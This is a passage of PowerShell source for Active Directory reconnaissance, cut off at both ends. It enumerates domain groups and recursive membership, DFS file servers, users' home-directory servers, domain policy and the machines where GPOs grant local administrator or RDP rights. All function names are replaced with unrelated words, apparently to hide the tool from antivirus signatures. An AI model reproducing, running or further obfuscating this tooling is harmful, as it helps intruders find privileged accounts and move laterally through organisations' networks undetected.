                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $SubnetProperties['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $SubnetProperties['Site'] = 'Error'
                            }

                            New-Object -TypeName PSObject -Property $SubnetProperties                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function OKs {


    param(
        [String]
        $Domain
    )

    $FoundDomain = Clemens -Domain $Domain
    
    if($FoundDomain) {

        $PrimaryDC = $FoundDomain.PdcRoleOwner
        $PrimaryDCSID = (summery -Domain $Domain -ComputerName $PrimaryDC -FullData).objectsid
        $Parts = $PrimaryDCSID.split("-")
        $Parts[0..($Parts.length -2)] -join "-"
    }
}


function unpinning {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,
        
        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData,

        [Switch]
        $RawSids,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $GroupSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if($GroupSearcher) {

            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            if ($UserName) {

                $User = Wanda -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize


                $UserDirectoryEntry = $User.GetDirectoryEntry()


                $UserDirectoryEntry.RefreshCache("tokenGroups")

                $UserDirectoryEntry.TokenGroups | Foreach-Object {

                    $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    

                    if(!($GroupSid -match '^S-1-5-32-545|-513$')) {
                        if($FullData) {
                            Wanda -SID $GroupSid -PageSize $PageSize
                        }
                        else {
                            if($RawSids) {
                                $GroupSid
                            }
                            else {
                                baffled $GroupSid
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    $GroupSearcher.filter = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
            
                $GroupSearcher.FindAll() | Where-Object {$_} | ForEach-Object {

                    if ($FullData) {

                        Sunkist -Properties $_.Properties
                    }
                    else {

                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}


function warding {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain = (Clemens).Name,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [Switch]
        $Recurse,

        [Switch]
        $UseMatchingRule,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {

        $GroupSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if(!$DomainController) {
            $DomainController = ((Clemens).PdcRoleOwner).Name
        }
    }

    process {

        if ($GroupSearcher) {

            if ($Recurse -and $UseMatchingRule) {

                if ($GroupName) {
                    $Group = unpinning -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $Group = unpinning -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                else {

                    $SID = (OKs -Domain $Domain) + "-512"
                    $Group = unpinning -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.name

                if ($GroupDN) {
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $Members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
                elseif ($SID) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {

                    $SID = (OKs -Domain $Domain) + "-512"
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }

                $GroupSearcher.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $GroupFoundName = $_.properties.name[0]
                        $Members = @()

                        if ($_.properties.member.Count -eq 0) {
                            $Finished = $False
                            $Bottom = 0
                            $Top = 0
                            while(!$Finished) {
                                $Top = $Bottom + 1499
                                $MemberRange="member;range=$Bottom-$Top"
                                $Bottom += 1500
                                $GroupSearcher.PropertiesToLoad.Clear()
                                [void]$GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                                try {
                                    $Result = $GroupSearcher.FindOne()
                                    if ($Result) {
                                        $RangedProperty = $_.Properties.PropertyNames -like "member;range=*"
                                        $Results = $_.Properties.item($RangedProperty)
                                        if ($Results.count -eq 0) {
                                            $Finished = $True
                                        }
                                        else {
                                            $Results | ForEach-Object {
                                                $Members += $_
                                            }
                                        }
                                    }
                                    else {
                                        $Finished = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $Finished = $True
                                }
                            }
                        } 
                        else {
                            $Members = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }

            $Members | Where-Object {$_} | ForEach-Object {

                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($DomainController) {
                        $Result = [adsi]"LDAP://$DomainController/$_"
                    }
                    else {
                        $Result = [adsi]"LDAP://$_"
                    }
                    if($Result){
                        $Properties = $Result.Properties
                    }
                }

                if($Properties) {

                    if($Properties.samaccounttype -notmatch '805306368') {
                        $IsGroup = $True
                    }
                    else {
                        $IsGroup = $False
                    }

                    if ($FullData) {
                        $GroupMember = Sunkist -Properties $Properties
                    }
                    else {
                        $GroupMember = New-Object PSObject
                    }

                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $Domain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        

                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {

                        $MemberName = $Properties.samaccountname[0]
                    } 
                    else {

                        try {
                            $MemberName = baffled $Properties.cn[0]
                        }
                        catch {

                            $MemberName = $Properties.cn
                        }
                    }
                    
                    if($Properties.objectSid) {
                        $MemberSid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $MemberSid = $Null
                    }

                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberSid' $MemberSid
                    $GroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GroupMember | Add-Member Noteproperty 'MemberDN' $MemberDN
                    $GroupMember


                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {
                        warding -FullData -Domain $MemberDomain -DomainController $DomainController -GroupName $MemberName -Recurse -PageSize $PageSize
                    }
                }

            }
        }
    }
}


function Cliburn {


    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String[]]
        $TargetUsers,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function throes {

        param([String]$Path)

        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }

    irregular -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {

            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {

            if($_.homedirectory) {
                throes($_.homedirectory)
            }
            if($_.scriptpath) {
                throes($_.scriptpath)
            }
            if($_.profilepath) {
                throes($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function retinae {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = "All",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function ticketed {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        $DFSsearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=fTDfs))"

            try {
                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $RemoteNames = $Properties.remoteservername

                    $DFSshares += $RemoteNames | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing DFS share : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "sheriffs error : $_"
            }
            $DFSshares | Sort-Object -Property "RemoteServerName"
        }
    }

    function sheriffs {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        $DFSsearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=msDFS-Linkv2))"
            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

            try {
                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $target_list = $Properties.'msdfs-targetlistv2'[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                    $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                        try {
                            $Target = $_.InnerText
                            if ( $Target.Contains('\') ) {
                                $DFSroot = $Target.split("\")[3]
                                $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing target : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "sheriffs error : $_"
            }
            $DFSshares | Sort-Object -Unique -Property "RemoteServerName"
        }
    }

    $DFSshares = @()
    
    if ( ($Version -eq "all") -or ($Version.endsWith("1")) ) {
        $DFSshares += ticketed -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq "all") -or ($Version.endsWith("2")) ) {
        $DFSshares += sheriffs -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    $DFSshares | Sort-Object -Property "RemoteServerName"
}








function antiabortion {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {

            $Parts = $GptTmplPath.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $GptTmplPath using a temp PSDrive at $RandDrive"

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $GptTmplPath : $_"
                return $Null
            }


            $GptTmplPath = $RandDrive + ":\" + $FilePath
        } 
    }

    process {
        $SectionName = ''
        $SectionsTemp = @{}
        $SectionsFinal = @{}

        try {

            if(Test-Path $GptTmplPath) {

                Write-Verbose "Parsing $GptTmplPath"

                Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                    if ($_ -match '\[') {

                        $SectionName = $_.trim('[]') -replace ' ',''
                    }
                    elseif($_ -match '=') {
                        $Parts = $_.split('=')
                        $PropertyName = $Parts[0].trim()
                        $PropertyValues = $Parts[1].trim()

                        if($PropertyValues -match ',') {
                            $PropertyValues = $PropertyValues.split(',')
                        }

                        if(!$SectionsTemp[$SectionName]) {
                            $SectionsTemp.Add($SectionName, @{})
                        }


                        $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )
                    }
                }

                ForEach ($Section in $SectionsTemp.keys) {

                    $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]
                }


                New-Object PSObject -Property $SectionsFinal
            }
        }
        catch {
            Write-Debug "Error parsing $GptTmplPath : $_"
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose "Removing temp PSDrive $RandDrive"
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}


function processors {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {

            $Parts = $GroupsXMLPath.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $GroupsXMLPath using a temp PSDrive at $RandDrive"

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $GroupsXMLPath : $_"
                return $Null
            }


            $GroupsXMLPath = $RandDrive + ":\" + $FilePath
        } 
    }

    process {


        if(Test-Path $GroupsXMLPath) {

            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath


            $GroupsXMLcontent | Select-Xml "//Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Members = @()
                $MemberOf = @()


                $LocalSid = $_.Properties.GroupSid
                if(!$LocalSid) {
                    if($_.Properties.groupName -match 'Administrators') {
                        $LocalSid = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $LocalSid = 'S-1-5-32-555'
                    }
                    else {
                        $LocalSid = $_.Properties.groupName
                    }
                }
                $MemberOf = @($LocalSid)

                $_.Properties.members | ForEach-Object {

                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {

                        if($_.sid) {
                            $Members += $_.sid
                        }
                        else {

                            $Members += $_.name
                        }
                    }
                }

                if ($Members -or $Memberof) {

                    $Filters = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }

                    if($ResolveSids) {
                        $Memberof = $Memberof | ForEach-Object {baffled $_}
                        $Members = $Members | ForEach-Object {baffled $_}
                    }

                    if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                    if($Members -isnot [system.array]) {$Members = @($Members)}

                    $GPOProperties = @{
                        'GPODisplayName' = $GPODisplayName
                        'GPOName' = $GPOName
                        'GPOPath' = $GroupsXMLPath
                        'Filters' = $Filters
                        'MemberOf' = $Memberof
                        'Members' = $Members
                    }

                    New-Object -TypeName PSObject -Property $GPOProperties
                }
            }
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose "Removing temp PSDrive $RandDrive"
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}



function Lilly {

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200

    )

    begin {
        $GPOSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if ($GPOSearcher) {
            if($DisplayName) {
                $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
            }
            else {
                $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
            }

            $GPOSearcher.FindAll() | Where-Object {$_} | ForEach-Object {

                Sunkist -Properties $_.Properties
            }
        }
    }
}


function devastation {


    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [Switch]
        $ResolveSids,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )


    Lilly -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {

        $Memberof = $Null
        $Members = $Null
        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        $GPOPath = $_.gpcfilesyspath

        $ParseArgs =  @{
            'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            'UsePSDrive' = $UsePSDrive
        }


        $Inf = antiabortion @ParseArgs

        if($Inf.GroupMembership) {

            $Memberof = $Inf.GroupMembership | Get-Member *Memberof | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
            $Members = $Inf.GroupMembership | Get-Member *Members | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }


            if ($Members -or $Memberof) {


                if(!$Memberof) {
                    $Memberof = 'S-1-5-32-544'
                }

                if($ResolveSids) {
                    $Memberof = $Memberof | ForEach-Object {baffled $_}
                    $Members = $Members | ForEach-Object {baffled $_}
                }

                if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                if($Members -isnot [system.array]) {$Members = @($Members)}

                $GPOProperties = @{
                    'GPODisplayName' = $GPODisplayName
                    'GPOName' = $GPOName
                    'GPOPath' = $GPOPath
                    'Filters' = $Null
                    'MemberOf' = $Memberof
                    'Members' = $Members
                }

                New-Object -TypeName PSObject -Property $GPOProperties
            }
        }

        $ParseArgs =  @{
            'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            'ResolveSids' = $ResolveSids
            'UsePSDrive' = $UsePSDrive
        }

        processors @ParseArgs
    }
}


function prenups {


    [CmdletBinding()]
    Param (
        [String]
        $UserName,

        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $LocalGroup = 'Administrators',
        
        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($UserName) {

        $User = irregular -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        $UserSid = $User.objectsid

        if(!$UserSid) {    
            Throw "User '$UserName' not found!"
        }

        $TargetSid = $UserSid
        $ObjectSamAccountName = $User.samaccountname
        $ObjectDistName = $User.distinguishedname
    }
    elseif($GroupName) {

        $Group = unpinning -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
        $GroupSid = $Group.objectsid

        if(!$GroupSid) {    
            Throw "Group '$GroupName' not found!"
        }

        $TargetSid = $GroupSid
        $ObjectSamAccountName = $Group.samaccountname
        $ObjectDistName = $Group.distinguishedname
    }
    else {
        throw "-UserName or -GroupName must be specified!"
    }

    if($LocalGroup -like "*Admin*") {
        $LocalSID = "S-1-5-32-544"
    }
    elseif ( ($LocalGroup -like "*RDP*") -or ($LocalGroup -like "*Remote*") ) {
        $LocalSID = "S-1-5-32-555"
    }
    elseif ($LocalGroup -like "S-1-5*") {
        $LocalSID = $LocalGroup
    }
    else {
        throw "LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' type sid."
    }

    Write-Verbose "LocalSid: $LocalSID"
    Write-Verbose "TargetSid: $TargetSid"
    Write-Verbose "TargetObjectDistName: $ObjectDistName"

    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }



    $TargetSid += unpinning -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $ObjectSamAccountName -RawSids

    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }

    Write-Verbose "Effective target sids: $TargetSid"

    $GPOGroupArgs =  @{
        'Domain' = $Domain
        'DomainController' = $DomainController
        'UsePSDrive' = $UsePSDrive
        'PageSize' = $PageSize
    }



    $GPOgroups = devastation @GPOGroupArgs | ForEach-Object {
        
        if ($_.members) {
            $_.members = $_.members | Where-Object {$_} | ForEach-Object {
                if($_ -match "S-1-5") {
                    $_
                }
                else {

                    fête -ObjectName $_ -Domain $Domain
                }
            }


            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            
            if($_.members) {
                try {



                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $TargetSid -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $LocalSid) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug "Error comparing members and $TargetSid : $_"
                }
            }
        }
    }

    Write-Verbose "GPOgroups: $GPOgroups"
    $ProcessedGUIDs = @{}


    $GPOgroups | Where-Object {$_} | ForEach-Object {

        $GPOguid = $_.GPOName

        if( -not $ProcessedGUIDs[$GPOguid] ) {
            $GPOname = $_.GPODisplayName
            $Filters = $_.Filters


            elongates -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData -PageSize $PageSize | ForEach-Object {

                if($Filters) {


                    $OUComputers = summery -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
                        $_.adspath -match ($Filters.Value)
                    } | ForEach-Object { $_.dnshostname }
                }
                else {
                    $OUComputers = summery -ADSpath $_.ADSpath -PageSize $PageSize
                }

                $GPOLocation = New-Object PSObject
                $GPOLocation | Add-Member Noteproperty 'ObjectName' $ObjectDistName
                $GPOLocation | Add-Member Noteproperty 'GPOname' $GPOname
                $GPOLocation | Add-Member Noteproperty 'GPOguid' $GPOguid
                $GPOLocation | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $GPOLocation | Add-Member Noteproperty 'Computers' $OUComputers
                $GPOLocation
            }


























            $ProcessedGUIDs[$GPOguid] = $True
        }
    }

}


function batches {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $OUName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $Recurse,

        [String]
        $LocalGroup = 'Administrators',

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
    
        if(!$ComputerName -and !$OUName) {
            Throw "-ComputerName or -OUName must be provided"
        }

        if($ComputerName) {
            $Computers = summery -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize

            if(!$Computers) {
                throw "Computer $Computer in domain '$Domain' not found!"
            }
            
            ForEach($Computer in $Computers) {

                $DN = $Computer.distinguishedname

                $TargetOUs = $DN.split(",") | Foreach-Object {
                    if($_.startswith("OU=")) {
                        $DN.substring($DN.indexof($_))
                    }
                }
            }
        }
        else {
            $TargetOUs = @($OUName)
        }

        Write-Verbose "Target OUs: $TargetOUs"

        $TargetOUs | Where-Object {$_} | Foreach-Object {

            $OU = $_


            $GPOgroups = elongates -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 

                $_.gplink.split("][") | Foreach-Object {
                    if ($_.startswith("LDAP")) {
                        $_.split(";")[0]
                    }
                }
            } | Foreach-Object {
                $GPOGroupArgs =  @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $_
                    'UsePSDrive' = $UsePSDrive
                    'PageSize' = $PageSize
                }


                devastation @GPOGroupArgs
            }


            $GPOgroups | Where-Object {$_} | Foreach-Object {
                $GPO = $_
                $GPO.members | Foreach-Object {


                    $Object = Wanda -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize

                    $GPOComputerAdmin = New-Object PSObject
                    $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName
                    $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU
                    $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                    $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $Object.name
                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_
                    $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')
                    $GPOComputerAdmin 


                    if($Recurse -and $GPOComputerAdmin.isGroup) {

                        warding -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {

                            $MemberDN = $_.distinguishedName


                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                            if ($_.samAccountType -ne "805306368") {
                                $MemberIsGroup = $True
                            }
                            else {
                                $MemberIsGroup = $False
                            }

                            if ($_.samAccountName) {

                                $MemberName = $_.samAccountName
                            }
                            else {

                                try {
                                    $MemberName = baffled $_.cn
                                }
                                catch {

                                    $MemberName = $_.cn
                                }
                            }

                            $GPOComputerAdmin = New-Object PSObject
                            $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU
                            $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                            $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $MemberName
                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $MemberDN
                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                            $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                            $GPOComputerAdmin 
                        }
                    }
                }
            }
        }
    }
}


function Marsala {


    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $Source ="Domain",

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    if($Source -eq "Domain") {

        $GPO = Lilly -Domain $Domain -DomainController $DomainController -GPOname "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if($GPO) {

            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }


            antiabortion @ParseArgs
        }

    }
    elseif($Source -eq "DC") {

        $GPO = Lilly -Domain $Domain -DomainController $DomainController -GPOname "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if($GPO) {

            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }


            antiabortion @ParseArgs | Foreach-Object {
                if($ResolveSids) {

                    $Policy = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq 'PrivilegeRights') {

                            $PrivilegeRights = New-Object PSObject


                            $_.Value.psobject.properties | Foreach-Object {

                                $Sids = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            baffled $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { baffled $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug "Error resolving SID : $_"
                                    }
                                }

                                $PrivilegeRights | Add-Member Noteproperty $_.Name $Sids
                            }

                            $Policy | Add-Member Noteproperty 'PrivilegeRights' $PrivilegeRights
                        }
                        else {
                            $Policy | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $Policy
                }
                else { $_ }
            }
        }
    }
}











function ghettoes {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $GroupName = 'Administrators',

        [Switch]
        $ListGroups,

        [Switch]
        $Recurse
    )

    begin {
        if ((-not $ListGroups) -and (-not $GroupName)) {

            $ObjSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $Objgroup = $ObjSID.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($Objgroup.Value).Split('\')[1]
        }
    }
    process {
